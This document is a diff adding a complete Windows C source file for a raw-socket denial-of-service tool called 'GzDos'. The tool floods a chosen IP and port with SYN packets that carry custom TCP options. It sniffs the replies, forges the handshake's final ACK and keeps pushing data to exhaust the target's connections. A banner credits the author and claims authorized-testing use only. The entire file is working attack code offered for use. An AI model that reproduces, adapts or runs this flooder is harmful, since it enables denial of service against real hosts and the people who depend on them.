@@ -1,0 +1,479 @@
+ #include "stdio.h"
+#include "winsock2.h"
+#include "windows.h"
+#include <ws2tcpip.h>
+#include "wchar.h"
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define SIO_RCVALL            _WSAIOW(IOC_VENDOR,1)
+
+char*    ATTACKIP =    "192.168.248.128";
+USHORT    ATTACKPORT =    135;
+USHORT    StartPort = 1;
+int        SLEEPTIME =    2000;
+UCHAR* optbuf = NULL;    //  选项字节
+char* psend = NULL;
+DWORD len = 0;
+USHORT optlen= 0;
+
+typedef struct ip_head     
+{
+    unsigned char h_verlen;     
+    unsigned char tos;         
+    unsigned short total_len; 
+    unsigned short ident;     
+    unsigned short frag_and_flags;
+    unsigned char ttl;         
+    unsigned char proto;     
+    unsigned short checksum;   
+    unsigned int sourceIP;     
+    unsigned int destIP;       
+}IPHEADER;
+
+typedef struct tcp_head 
+{
+    USHORT th_sport;         
+    USHORT th_dport;         
+    unsigned int th_seq;     
+    unsigned int th_ack;     
+    unsigned char th_lenres;     
+    unsigned char th_flag;     
+    USHORT th_win;         
+    USHORT th_sum;         
+    USHORT th_urp;         
+}TCPHEADER;
+
+typedef struct tsd_hdr 
+{
+    unsigned long saddr;   
+    unsigned long daddr;   
+    char mbz;
+    char ptcl;               
+    unsigned short tcpl; 
+}PSDHEADER;
+
+typedef struct attack_obj
+{
+    DWORD    dwIP;
+    USHORT    uAttackPort[11];
+    struct attack_obj*    Next;
+}ATOBJ;
+
+
+ATOBJ*    ListAttackObj=0;
+
+////////////////////////////////////////////////////
+BOOL    InitStart();
+DWORD    GetHostIP();
+USHORT    checksum(USHORT *buffer, int size);
+DWORD    WINAPI  ThreadSynFlood(LPVOID lp);
+void    SendData(DWORD SEQ, DWORD ACK, USHORT SPort, USHORT APort, DWORD SIP, DWORD AIP, char* pBuf,BOOL Isdata,DWORD dwSize);
+DWORD   WINAPI  ListeningFunc(LPVOID lpvoid);
+void    Banner();
+void debugip ( DWORD dwip);
+void ConvertOpt (CHAR* pu);
+////////////////////////////////////////////////////
+
+SOCKET sock = NULL;
+
+int main(int argc, char* argv[])
+{
+    Banner();
+    psend = (char*)malloc(800);
+    memset(psend,0x38,799);
+    psend[799] = 0;
+    len = strlen(psend);
+    if ( argc < 5)
+    {
+        printf("input error!\n");
+        return -1;
+    }
+    ATTACKIP = strdup(argv[1]);
+    ATTACKPORT = atoi(argv[2]);
+    CHAR* optbuftemp = (CHAR*)strdup(argv[3]);   
+    ConvertOpt (optbuftemp);
+    optbuf[3]-=1;
+    if ( argc == 5)
+        SLEEPTIME = atoi(argv[4]);
+    if ( argc == 6)
+    {
+        SLEEPTIME = atoi(argv[4]);
+        StartPort = atoi(argv[5]);
+    }
+    char HostName[255]={0};
+    if ( InitStart() == FALSE )
+        return -1;
+    if ( optbuf != NULL)
+    {
+        int i=0;
+        struct hostent* lp = NULL;
+       
+        gethostname(HostName,255);
+        lp = gethostbyname (HostName);
+        while ( lp->h_addr_list[i] != NULL )
+        {
+            HANDLE    h=NULL;
+            DWORD    dwIP=0;   
+            dwIP = *(DWORD*)lp->h_addr_list[i++];
+            h=CreateThread(NULL,NULL,ListeningFunc,(LPVOID)dwIP,NULL,NULL);           
+            if ( h == NULL )
+            {
+                printf("Create ListeningFunc Thread False!\n");
+                return -1;
+            }
+            Sleep(500);
+        }
+            ThreadSynFlood(NULL);
+    }
+    else return -1;
+   
+    Sleep(5555555);
+
+}
+
+BOOL InitStart()
+{
+    BOOL flag;
+    int  nTimeOver;
+    WSADATA WSAData;
+    if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0)
+    {
+        printf("WSAStartup Error!\n");
+        return FALSE;
+    }
+    ListAttackObj = (ATOBJ*) calloc (1,sizeof(ATOBJ));
+    ListAttackObj->dwIP = inet_addr( ATTACKIP );
+    ListAttackObj->uAttackPort[0] = htons(ATTACKPORT);
+    ListAttackObj->uAttackPort[1] = 0;
+    ListAttackObj->Next=NULL;
+    sock=NULL;
+    if ((sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET)
+    {
+        printf("Socket Setup Error!\n");
+        return FALSE;
+    }
+    flag=true;
+    if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR)
+    {
+        printf("setsockopt IP_HDRINCL error!\n");
+        return FALSE;
+    }
+    nTimeOver=2000;
+    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver))==SOCKET_ERROR)                                //设置发送的时间
+    {
+        printf("setsockopt SO_SNDTIMEO error!\n");
+        return FALSE;
+    }   
+    return TRUE;
+}
+
+DWORD  WINAPI  ThreadSynFlood(LPVOID lp)
+{
+    ATOBJ* pAtObj = ListAttackObj;
+    SOCKADDR_IN addr_in;
+    IPHEADER ipHeader;
+    TCPHEADER tcpHeader;
+    PSDHEADER psdHeader;
+    char szSendBuf[1024]={0};
+    int i=0;
+    while (  pAtObj != NULL )
+    {
+        addr_in.sin_family=AF_INET;
+        addr_in.sin_addr.S_un.S_addr=pAtObj->dwIP;
+        ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
+        ipHeader.tos=0;
+        ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)+optlen);     //IP总长度
+        ipHeader.ident=1;
+        ipHeader.frag_and_flags=0x0040;               
+        ipHeader.ttl=0x80;         
+        ipHeader.proto=IPPROTO_TCP;
+        ipHeader.checksum=0;
+        ipHeader.destIP=pAtObj->dwIP;
+        ipHeader.sourceIP = GetHostIP();
+        tcpHeader.th_ack=0;   
+        tcpHeader.th_lenres = (optlen/4+5)<<4;
+        tcpHeader.th_flag=2;             
+        tcpHeader.th_win=htons(0x4470);
+        tcpHeader.th_urp=0;
+        tcpHeader.th_seq=htonl(0x00198288);
+        for ( int l=StartPort; l<65535;l++)
+        {
+            int k =0;
+            while ( pAtObj->uAttackPort[k] != 0 )
+            {
+                tcpHeader.th_dport=pAtObj->uAttackPort[k++];
+                psdHeader.daddr=ipHeader.destIP;
+                psdHeader.mbz=0;
+                psdHeader.ptcl=IPPROTO_TCP;
+                psdHeader.tcpl=htons(sizeof(tcpHeader));
+                int sendnum = 0;           
+                int optlentemp = optlen;
+                tcpHeader.th_sport=htons(l);
+                tcpHeader.th_sum=0;
+                psdHeader.saddr=ipHeader.sourceIP;
+                memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
+                memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
+                memcpy(szSendBuf+sizeof(psdHeader)+sizeof(tcpHeader),optbuf,optlentemp);
+                tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)+optlentemp);
+                tcpHeader.th_sum = htons(ntohs(tcpHeader.th_sum)-(USHORT)optlentemp);       
+                memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
+                memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
+                memcpy(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader),optbuf,optlentemp);
+                int rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)+optlentemp, 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
+                if ( sendnum++ > 10 )
+                {
+                    sendnum=0;
+                }
+                if (rect==SOCKET_ERROR)
+                {
+                    printf("send error!:%x\n",WSAGetLastError());
+                    return false;
+                }
+                else    printf("            send ok %d \n", l);                   
+            }//endwhile
+            Sleep(SLEEPTIME); 
+        }
+        pAtObj = pAtObj->Next;
+    }
+    return 0;
+}
+
+DWORD GetHostIP()
+{
+    DWORD dwIP=0;
+    int i=0;
+    struct hostent* lp = NULL;
+    char HostName[255] = {0};
+    gethostname(HostName,255);
+    lp = gethostbyname (HostName);
+    while ( lp->h_addr_list[i] != NULL )
+        i++;
+    dwIP = *(DWORD*)lp->h_addr_list[--i];
+    return dwIP;
+}
+   
+USHORT checksum(USHORT *buffer, int size)
+{
+    unsigned long cksum=0;
+    while(size >1)
+    {
+        cksum+=*buffer++;
+        size -=sizeof(USHORT);
+    }
+    if(size)
+    {
+        cksum += *(UCHAR*)buffer;
+    }
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum += (cksum >>16);
+    return (USHORT)(~cksum);
+}
+
+DWORD   WINAPI  ListeningFunc(LPVOID lpvoid)
+{
+    SOCKET rawsock;
+    SOCKADDR_IN addr_in={0};
+    if ((rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET)
+    {
+        printf("Sniffer Socket Setup Error!\n");
+        return false;
+    }
+    addr_in.sin_family=AF_INET;
+    addr_in.sin_port=htons(8288);
+    addr_in.sin_addr.S_un.S_addr= (DWORD)lpvoid;
+    //对rawsock绑定本机IP和端口
+    int ret=bind(rawsock, (struct sockaddr *)&addr_in, sizeof(addr_in));
+    if(ret==SOCKET_ERROR)
+    {
+        printf("bind false\n");
+        exit(0);
+    }
+    DWORD lpvBuffer = 1;
+    DWORD lpcbBytesReturned = 0;
+    WSAIoctl(rawsock, SIO_RCVALL, &lpvBuffer, sizeof(lpvBuffer), NULL, 0, &lpcbBytesReturned, NULL, NULL);
+    while (TRUE)
+    {
+        SOCKADDR_IN from={0};
+        int  size=sizeof(from);
+        char RecvBuf[256]={0};
+        //接收数据包
+        ret=recvfrom(rawsock,RecvBuf,sizeof(RecvBuf),0,(struct sockaddr*)&from,&size);
+        if(ret!=SOCKET_ERROR)
+        {
+            // 分析数据包
+            IPHEADER *lpIPheader;
+            lpIPheader=(IPHEADER *)RecvBuf;
+            if (lpIPheader->proto==IPPROTO_TCP && lpIPheader->sourceIP == inet_addr(ATTACKIP) )
+            {
+           
+                TCPHEADER *lpTCPheader=(TCPHEADER*)(RecvBuf+sizeof(IPHEADER));
+                //判断是不是远程开放端口返回的数据包
+                if ( lpTCPheader->th_flag==0x12)
+                {
+                    if ( lpTCPheader->th_ack == htonl(0x00198289) )
+                    {//伪造第3次握手
+                        SendData(lpTCPheader->th_ack,htonl(ntohl(lpTCPheader->th_seq)+1), \
+                        lpTCPheader->th_dport,lpTCPheader->th_sport,lpIPheader->destIP,lpIPheader->sourceIP,NULL,FALSE,0);
+                        //主动发出一次数据
+                        SendData(lpTCPheader->th_ack,htonl(ntohl(lpTCPheader->th_seq)+1), \
+                        lpTCPheader->th_dport,lpTCPheader->th_sport,lpIPheader->destIP,lpIPheader->sourceIP,psend,TRUE,len);
+                    }
+               
+                }
+                else
+                {
+                    if ( lpTCPheader->th_flag == 0x10 )
+                    //继续发送数据
+                    SendData(lpTCPheader->th_ack,lpTCPheader->th_seq,\
+                    lpTCPheader->th_dport,lpTCPheader->th_sport,lpIPheader->destIP,lpIPheader->sourceIP,psend,TRUE,len);
+                }
+
+            }           
+           
+        }
+    }     // end while
+
+}
+
+void SendData(DWORD SEQ, DWORD ACK, USHORT SPort, USHORT APort, DWORD SIP, DWORD AIP, char* pBuf, BOOL Isdata,DWORD dwSize)
+{
+   
+    SOCKADDR_IN addr_in;
+    IPHEADER ipHeader;
+    TCPHEADER tcpHeader;
+    PSDHEADER psdHeader;
+
+    char szSendBuf[1024]={0};
+    addr_in.sin_family=AF_INET;
+    addr_in.sin_port = APort;
+    addr_in.sin_addr.S_un.S_addr = AIP;
+    ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
+    ipHeader.tos=0;
+
+    ipHeader.ident=1;
+    ipHeader.frag_and_flags=0x0040;               
+    ipHeader.ttl=0x80;         
+    ipHeader.proto=IPPROTO_TCP;
+    ipHeader.checksum=0;
+    ipHeader.destIP=AIP;
+    ipHeader.sourceIP = SIP;
+    tcpHeader.th_dport = APort;
+    tcpHeader.th_ack = ACK;   
+    tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0);
+    tcpHeader.th_seq= SEQ;
+    tcpHeader.th_win=htons(0x4470);
+    tcpHeader.th_sport=SPort;
+    ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)+dwSize);
+    if ( !Isdata)
+    {
+
+        tcpHeader.th_flag=0x10;
+   
+    }//    ack   
+    else
+    {
+        tcpHeader.th_flag=0x18;
+    }
+    tcpHeader.th_urp=0;
+    psdHeader.daddr=ipHeader.destIP;
+    psdHeader.mbz=0;
+    psdHeader.ptcl=IPPROTO_TCP;
+    psdHeader.tcpl=htons(sizeof(tcpHeader));   
+    tcpHeader.th_sum=0;
+    psdHeader.saddr=ipHeader.sourceIP;
+    memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
+    memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
+    if ( pBuf != NULL )
+    {   
+        memcpy(szSendBuf+sizeof(psdHeader)+sizeof(tcpHeader),pBuf,dwSize);
+        tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)+dwSize);
+        tcpHeader.th_sum = htons(ntohs(tcpHeader.th_sum)-(USHORT)dwSize);
+    }
+    else
+    {
+        tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));
+    }
+
+    memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
+    memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
+    int rect=0;
+    if ( pBuf == NULL )
+        rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader), 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
+    else
+    {
+        memcpy(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), pBuf, dwSize);
+        rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)+dwSize, 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
+    }
+
+    if (rect==SOCKET_ERROR)
+    {
+        printf("send error!:%x\n",WSAGetLastError());
+        return;
+    }
+    else   
+    {
+        if ( pBuf != NULL )
+            printf("SendData ok %d\n",ntohs(SPort));
+        else
+            printf("                    SendAck ok %d\n",ntohs(SPort));
+    }
+
+}
+
+void Banner()
+{
+    printf("****************************************************\n");
+    printf("                   狗仔 D.o.S test\n");
+    printf("Maker By LionD8. QQ:10415468. Email:liond8@eyou.com\n");
+    printf("    Welcome to my website: http://liond8.126.com\n");
+    printf("   仅供授权测试使用，否则引起任何法律纠纷后果自负\n");
+    printf("****************************************************\n");
+
+    printf("GzDos.exe <Attack IP> <Attack Port> <OptString> <SleepTime = default 2000> <StartPort>\n");
+}
+
+
+void debugip ( DWORD dwip)
+{
+
+    struct in_addr A = {0};
+    A.S_un.S_addr = dwip;
+    printf("%s",inet_ntoa(A));
+
+}
+
+void ConvertOpt (CHAR* pu)
+{
+    int i=0 , lentemp;
+    lentemp = strlen(pu);
+    optlen = lentemp/2;
+    optbuf = (UCHAR*)malloc(optlen);
+    int k=0;
+    for ( i = 0 ; i < lentemp ; i+=2 )
+    {
+        BYTE tempb = 0;
+        tempb = pu[i+1];
+        if ( tempb < '9')
+            tempb = tempb - 0x30;
+        else
+        {
+            tempb = tempb - 0x37;
+        }
+
+        optbuf[k] = tempb;
+
+        tempb = 0;
+        tempb = pu[i];
+        if ( tempb < '9')
+            tempb = tempb - 0x30;
+        else
+        {
+            tempb = tempb - 0x37;
+        }
+
+        tempb= tempb<<4;
+        optbuf[k]+= tempb;
+        k++;
+    }
+}
